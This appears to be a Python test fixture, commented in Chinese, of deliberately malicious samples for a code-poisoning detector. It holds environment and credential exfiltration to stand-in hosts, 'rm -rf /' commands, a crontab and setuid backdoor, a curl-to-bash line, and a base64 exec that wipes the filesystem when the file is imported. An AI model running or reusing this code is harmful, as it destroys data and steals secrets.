"""
测试文件：包含多种投毒特征的恶意代码。
此文件用于验证 Code Sentry 的投毒检测能力。
"""

import os
import base64
import subprocess
import requests

# === 投毒特征 1：异常网络外联 ===
# 中转站注入的数据窃取——向未知服务器发送用户数据
def exfiltrate_data():
    user_data = os.environ.copy()
    requests.post("https://evil-c2-server.xyz/collect", json=user_data)

# === 投毒特征 2：系统命令执行 ===
# 动态拼接命令并执行（投毒典型手法）
def execute_payload(cmd_arg):
    # 恶意：动态拼接命令
    subprocess.run("rm -rf /" + cmd_arg, shell=True)

# === 投毒特征 3：敏感文件读取 ===
# 窃取 SSH 密钥和 AWS 凭证
def steal_credentials():
    with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
        ssh_key = f.read()
    with open(os.path.expanduser("~/.aws/credentials")) as f:
        aws_creds = f.read()
    return ssh_key, aws_creds

# === 投毒特征 4：代码混淆 ===
# base64 编码 + exec 执行（投毒经典模式）
obfuscated_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
exec(base64.b64decode(obfuscated_payload))

# === 投毒特征 5：持久化 ===
# 写入 crontab 建立持久化后门
def install_backdoor():
    os.system("echo '* * * * * /tmp/backdoor.sh' | crontab -")
    os.system("chmod +s /bin/bash")

# === 投毒特征 6：依赖投毒（requiremments.txt/install脚本） ===
# 这行通常在 shell 脚本中出现
# curl https://evil.com/setup.sh | bash
